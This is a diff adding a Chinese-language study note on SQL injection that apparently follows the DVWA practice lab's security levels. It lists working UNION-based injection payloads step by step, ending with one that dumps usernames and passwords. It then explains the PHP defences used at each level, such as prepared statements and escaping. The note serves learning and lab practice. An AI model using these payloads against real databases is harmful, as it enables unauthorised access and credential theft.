@@ -1,0 +1,28 @@
+一、SQL Injection
+1.判断是否存在注入，注入是字符型还是数字型	1 or 1=1 / 1' or 1=1#
+2.猜解SQL查询语句中的字段数	order by
+3.确定显示的字段顺序	union select 
+4.获取当前数据库	union select database(),user(),version()//1' union select 1,schema_name from information_schema.schemata #
+5.获取数据库中的表	1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
+6.获取表中的字段名	1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
+7.下载数据	1' union select 1,concat_ws('--',user,password) from users #
+	Impossible：
+		1.isset()	检测变量是否存在若变量不存在则返回 FALSE 若变量存在且其值为NULL，也返回 FALSE 若变量存在且值不为NULL，则返回 TURE 
+		2.$_REQUEST、$_POST、$_GET
+		3.is_numeric( )	检测是否为数字
+		4.prepare() 准备要执行的语句，和 bindparam() 和 execute() 连用	用来更方便地执行多条除了占位内容不同外  其他内容相同的语句
+		5.fetch() 从一个 PDOStatement 对象相关的结果集中获取下一行
+		6.PDOStatement::rowCount() 返回受 DELETE、INSERT、 或 UPDATE 语句影响的行数。
+		7.PDO 详细网站https://www.cnblogs.com/zhouguowei/p/5212994.html
+	Low:
+		1.mysqli_query(connection,query,resultmode); 执行某个针对数据库的查询。
+		2.die(message)	输出一条消息，并退出当前脚本。
+		3.<pre>		<pre></pre>是html标签，意思是按原样输出不做更改。
+		4.is_object() 函数用于检测变量是否是一个对象。
+		5.mysqli_error(connection);	返回最近调用函数的最后一个错误描述。
+		6.mysqli_connect_error(); 函数返回上一次连接错误的错误描述。
+		7.concat.ws()函数,有分隔符的字符串连接 select concat_ws(',','11','22','33');//11,22,33
+	Medium:
+		1.mysqli_real_escape_string(connection,escapestring);转义在 SQL 语句中使用的字符串中的特殊字符。
+	High:
+		1.Limite LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。
